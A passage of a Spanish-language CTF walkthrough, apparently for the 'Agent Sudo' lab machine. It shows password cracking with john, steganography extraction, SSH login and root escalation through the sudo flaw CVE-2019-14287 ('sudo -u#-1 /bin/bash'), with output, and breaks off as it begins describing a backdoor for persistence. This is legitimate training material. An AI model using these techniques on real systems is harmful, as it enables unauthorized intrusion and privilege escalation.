"},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"--wordlist [lista de palabras]:"}]},{"type":"text","value":" Lista de palabras a usar."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"john --wordlist=/usr/share/wordlists/rockyou.txt zip2john.txt\n\n[...]\nalien            (8702.zip/To_agentR.txt)\n1g 0:00:00:00 DONE (2025-05-30 19:47) 1.351g/s 44281p/s 44281c/s 44281C/s christal..eatme1\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"john --wordlist=/usr/share/wordlists/rockyou.txt zip2john.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"alien            (8702.zip/To_agentR.txt)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"1g 0:00:00:00 DONE (2025-05-30 19:47) 1.351g/s 44281p/s 44281c/s 44281C/s christal..eatme1\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Use the \"--show\" option to display all of the cracked passwords reliably\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Session completed.\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Encontramos que la contrase帽a para descomprimir el archivo es "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"alien"}]},{"type":"text","value":". Al descomprimir el archivo ZIP obtenemos el archivo de texto "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"To_agentR.txt"}]},{"type":"text","value":" el cual contiene el siguiente mensaje."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"Agent C,\n\nWe need to send the picture to 'QXJlYTUx' as soon as possible!\n\nBy,\nAgent R\n","filename":"_cutie.png.extracted/To_agentR.txt","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Agent C,\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"We need to send the picture to 'QXJlYTUx' as soon as possible!\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"By,\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Agent R\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"A simple vista esto no parece sernos de utilidad, pero la cadena de texto "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"QXJlYTUx"}]},{"type":"text","value":" puede estar codificada. Ingresamos esta cadena de texto en "},{"type":"element","tag":"a","props":{"href":"https://cyberchef.io/","rel":["nofollow"]},"children":[{"type":"text","value":"CyberChef"}]},{"type":"text","value":". La pagina autom谩ticamente reconoce que esta cadena de texto esta codificada en Base64. Al decodificarla obtenemos la frase "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"Area51"}]},{"type":"text","value":"."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"驴Obtuvimos la contrase帽a de SSH? Resulta no ser valida. Si esta imagen contiene un archivo incrustado, probablemente la otra imagen tambi茅n."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"strings"}]},{"type":"text","value":" revela que la imagen "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"cute-alien.png"}]},{"type":"text","value":" contiene informaci贸n adicional incrustada."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"strings cute-alien.png | head -n 20 && echo \".....\" && strings cute-alien.png | tail -n 20\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"strings"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" cute-alien.png"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#F97583"},"children":[{"type":"text","value":" |"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":" head"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -n"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 20"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#E1E4E8"},"children":[{"type":"text","value":" && "}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":"echo"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \".....\""}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#E1E4E8"},"children":[{"type":"text","value":" && "}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"strings"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" cute-alien.png"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#F97583"},"children":[{"type":"text","value":" |"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":" tail"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -n"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 20\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicaci贸n del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"strings:"}]},{"type":"text","value":" Mostrar cadenas de texto legibles para humanos."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"head:"}]},{"type":"text","value":" Mostrar las primeras 10 lineas de un archivo."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-n [numero]:"}]},{"type":"text","value":" Mostrar las primeras lineas."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"tail:"}]},{"type":"text","value":" Mostrar las ultimas 10 lineas de un archivo."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-n [numero]:"}]},{"type":"text","value":" Mostrar las ultimas lineas."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"strings cute-alien.png | head -n 20 && echo \".....\" && strings cute-alien.png | tail -n 20\n\nJFIF\n , #&')*)\n-0-(0%()(\n((((((((((((((((((((((((((((((((((((((((((((((((((\n$3br\n%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz\n        #3R\n&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz\n~U,q\n.c@6\n[...]\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"strings cute-alien.png | head -n 20 && echo \".....\" && strings cute-alien.png | tail -n 20\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"JFIF\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":" , #&')*)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"-0-(0%()(\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"((((((((((((((((((((((((((((((((((((((((((((((((((\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"$3br\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":9},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"        #3R\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":10},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":11},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"~U,q\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":12},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":".c@6\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":13},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Nota las cadenas de caracteres inusuales en las primeras lineas de la salida. Definitivamente hay informaci贸n adicional incrustada en la imagen. Compara la salida de "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"strings"}]},{"type":"text","value":" anterior con el de una imagen normal."}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"binwalk"}]},{"type":"text","value":" no revela archivos incrustados. Es posible que la informaci贸n adicional haya sido incrustada mediante m茅todos de esteganograf铆a."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"驴Recuerdas la frase anterior? Si se hizo uso de esteganograf铆a para ocultar informaci贸n, esta habr谩 sido ocultada con la ayuda de una frase secreta. Es posible que esta sea la frase usada. Para extraer esta informaci贸n haremos uso de "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"steghide"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"steghide extract -sf cute-alien.jpg -p \"Area51\"\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"steghide"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" extract"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -sf"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" cute-alien.jpg"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -p"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \"Area51\"\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicaci贸n del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"steghide:"}]},{"type":"text","value":" Herramienta de esteganograf铆a."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"extract:"}]},{"type":"text","value":" Extraer datos ocultos de un archivo."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-sf [archivo]:"}]},{"type":"text","value":" Especificar el nombre del archivo."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-p [frase]:"}]},{"type":"text","value":" Usar la frase secreta."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"steghide extract -sf cute-alien.jpg -p \"Area51\"\n\nwrote extracted data to \"message.txt\".\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"steghide extract -sf cute-alien.jpg -p \"Area51\"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"wrote extracted data to \"message.txt\".\n"}]}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Alternativamente, si no conocemos la frase secreta para extraer informaci贸n de un archivo de esteganograf铆a, podemos hacer uso de "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"stegseek"}]},{"type":"text","value":" para "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"crackearla"}]},{"type":"text","value":" haciendo uso de una lista de palabras."}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"La informaci贸n fue extra铆da en el archivo "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"message.txt"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"Hi james,\n\nGlad you find this message. Your login password is hackerrules!\n\nDon't ask me why the password look cheesy, ask agent R who set this password for you.\n\nYour buddy,\nchris\n","filename":"message.txt","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Hi james,\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Glad you find this message. Your login password is hackerrules!\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Don't ask me why the password look cheesy, ask agent R who set this password for you.\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Your buddy,\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"chris\n"}]}]}]}]},{"type":"element","tag":"h3","props":{"id":"ssh-1"},"children":[{"type":"text","value":"SSH"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descubrimos el usuario "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"james"}]},{"type":"text","value":" y su contrase帽a "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"hackerrules!"}]},{"type":"text","value":". Usamos estas credenciales para ingresar al servidor SSH."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Dentro de la carpeta "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"home"}]},{"type":"text","value":" de nuestro usuario encontraremos la bandera del usuario y la imagen "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"Alien_autospy.jpg"}]},{"type":"text","value":" que contiene la respuesta a la pregunta \"What is the incident of the photo called?\". Para copiar la imagen a nuestra maquina local puedes usar el comando "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"scp james@10.10.195.209/Alien_autospy.jpg ."}]},{"type":"text","value":" en una nueva terminal y luego ingresar la contrase帽a de "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"james"}]},{"type":"text","value":"."}]},{"type":"element","tag":"h2","props":{"id":"escalada-de-privilegios"},"children":[{"type":"text","value":"Escalada de privilegios"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Enumeramos el usuario actual. Una de las primeras cosas que debemos hacer en CTFs cuando obtenemos un "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"foothold"}]},{"type":"text","value":" en la maquina objetivo es ingresar el comando "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"sudo -ll"}]},{"type":"text","value":" (en este caso deberemos usar "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"sudo -l"}]},{"type":"text","value":" por razones que explicare mas adelante)."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"james@agent-sudo:~$ sudo -l\n\n[sudo] password for james: hackerrules!\nMatching Defaults entries for james on agent-sudo:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser james may run the following commands on agent-sudo:\n    (ALL, !root) /bin/bash\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"james@agent-sudo:~$ sudo -l\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[sudo] password for james: hackerrules!\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Matching Defaults entries for james on agent-sudo:\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"User james may run the following commands on agent-sudo:\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"    (ALL, !root) /bin/bash\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicaci贸n del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"sudo:"}]},{"type":"text","value":" Ejecutar comandos como otro usuario."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-l:"}]},{"type":"text","value":" Listar los privilegios del usuario invocador (si no se especifica con la opci贸n -U)."}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Aunque la salida del comando "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"sudo -ll"}]},{"type":"text","value":" tiene un formato mas legible que "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"sudo -l"}]},{"type":"text","value":", la linea "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"(ALL, !root) /bin/bash"}]},{"type":"text","value":" sera clave para identificar la vulnerabilidad."}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"La salida del comando anterior puede resultar poco clara, pero esta nos informa que el usuario "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"james"}]},{"type":"text","value":" puede ejecutar el comando "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"/bin/bash"}]},{"type":"text","value":" como cualquier usuario excepto "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"root"}]},{"type":"text","value":". Parece seguro 驴No? En realidad existe un CVE especifico para esta situaci贸n que nos permitir谩 escalar nuestros privilegios a root."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Para identificar esta vulnerabilidad podemos buscar la frase "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"(ALL, !root) /bin/bash"}]},{"type":"text","value":" (驴No te parece inusual o demasiado especifica?) en el motor de b煤squeda de tu preferencia y se nos apuntara al CVE-2019-14287. Todas las versiones de Sudo anteriores a 1.8.28 presentan una falla en la ejecuci贸n de comandos con un User ID (UID) arbitrario.  Alternativamente, podemos usar herramientas de enumeraci贸n como "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"linpeas"}]},{"type":"text","value":" o "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"LinEnum"}]},{"type":"text","value":" para identificar que la versi贸n de sudo es vulnerable a este CVE."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Podemos comprobar que la versi贸n de sudo presente en la maquina objetivo es vulnerable a este CVE."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"james@agent-sudo:~$ sudo --version\n\nSudo version 1.8.21p2\nSudoers policy plugin version 1.8.21p2\nSudoers file grammar version 46\nSudoers I/O plugin version 1.8.21p2\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"james@agent-sudo:~$ sudo --version\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Sudo version 1.8.21p2\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Sudoers policy plugin version 1.8.21p2\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Sudoers file grammar version 46\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Sudoers I/O plugin version 1.8.21p2\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Para explicar mejor esta vulnerabilidad, es necesario saber que el usuario root siempre tendr谩 un UID de 0 y que un usuario en Linux tambi茅n puede ser referenciado directamente haciendo uso de su UID. Por ejemplo, tanto el comando "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"id root"}]},{"type":"text","value":" como "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"id 0"}]},{"type":"text","value":" mostraran los identificadores del usuario root. En el caso del comando "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"sudo"}]},{"type":"text","value":", la opci贸n "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"-u"}]},{"type":"text","value":" (usada para ejecutar un comando como otro usuario) admite UIDs haciendo uso del formato "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"#uid"}]},{"type":"text","value":". De esta forma podr铆amos ejecutar un comando como root haciendo uso de "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"sudo -u#0 [comando]"}]},{"type":"text","value":"."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"La vulnerabilidad reside en el hecho de que un UID . Esta falla solo afecta a configuraciones de sudo donde alguna entrada en el archivo sudoers permite ejecutar un comando como cualquier usuario excepto root."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"sudo -u#-1 /bin/bash\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"sudo"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -u"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#E1E4E8"},"children":[{"type":"text","value":"#-1 /bin/bash\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicaci贸n del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"sudo:"}]},{"type":"text","value":" Ejecutar comandos como otro usuario."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-u [usuario]:"}]},{"type":"text","value":" Ejectuar el comando como el usuario especificado."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"james@agent-sudo:~$ sudo -u#-1 /bin/bash\n\nroot@agent-sudo:~# id\nuid=0(root) gid=1000(james) groups=1000(james)\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"james@agent-sudo:~$ sudo -u#-1 /bin/bash\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"root@agent-sudo:~# id\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"uid=0(root) gid=1000(james) groups=1000(james)\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Dentro de la carpeta "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"/root"}]},{"type":"text","value":" encontraremos la bandera de root y la respuesta a la pregunta bonus."}]},{"type":"element","tag":"h2","props":{"id":"persistencia"},"children":[{"type":"text","value":"Persistencia"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Ahora que hemos escalado privilegios a "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"root"}]},{"type":"text","value":", deberiamos de crear un "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"backdoor"}]},{"type":"text","value":" para asegurar la persistencia del ingreso a una cuenta con altos privilegios en esta maquina. Existen distintas formas para crear un "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"backdoor"}]},{"type":"text","value":" que nos permita acceder directamente al usuario "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"root"}]},{"type":"text","value":", pero teniendo en cuenta que muchas de 